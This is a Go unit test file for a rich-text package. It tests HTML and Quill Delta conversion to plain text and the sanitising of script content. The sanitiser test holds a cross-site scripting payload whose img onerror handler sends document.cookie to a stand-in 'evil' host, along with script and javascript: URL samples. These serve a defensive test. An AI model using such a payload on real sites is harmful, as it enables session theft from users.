package richtext

import (
	"strings"
	"testing"
)

func TestPlainText(t *testing.T) {
	cases := []struct {
		name     string
		input    string
		expected string
	}{
		{
			name:     "empty string",
			input:    "",
			expected: "",
		},
		{
			name:     "plain text",
			input:    "Hello world",
			expected: "Hello world",
		},
		{
			name:     "html markup",
			input:    "<h1>Title</h1><p>Paragraph with <strong>bold</strong> text.</p>",
			expected: "TitleParagraph with bold text.",
		},
		{
			name:     "quill delta format",
			input:    `{"ops":[{"insert":"Quill Title\n"},{"insert":"Body paragraph.\n"}]}`,
			expected: "Quill Title\nBody paragraph.",
		},
		{
			name:     "quill document envelope",
			input:    `{"document":[{"insert":"Envelope Title\n"}]}`,
			expected: "Envelope Title",
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := PlainText(tc.input)
			if got != tc.expected {
				t.Errorf("got %q, want %q", got, tc.expected)
			}
		})
	}
}

func TestCleanStripsScriptsButKeepsMarkupAndDeltas(t *testing.T) {
	dirty := `<p>Deri <strong>kemer</strong></p><img src=x onerror="fetch('//evil/'+document.cookie)"><script>alert(1)</script><a href="javascript:alert(1)">x</a>`
	clean := Clean(dirty)
	for _, banned := range []string{"onerror", "<script", "javascript:"} {
		if strings.Contains(clean, banned) {
			t.Fatalf("Clean kept %q: %s", banned, clean)
		}
	}
	if !strings.Contains(clean, "<strong>kemer</strong>") {
		t.Fatalf("Clean dropped allowed markup: %s", clean)
	}
	delta := `{"ops":[{"insert":"<script>alert(1)</script>\n"}]}`
	if got := Clean(delta); got != delta {
		t.Fatalf("a Delta document must be stored unchanged (the renderer escapes inserts), got %s", got)
	}
}
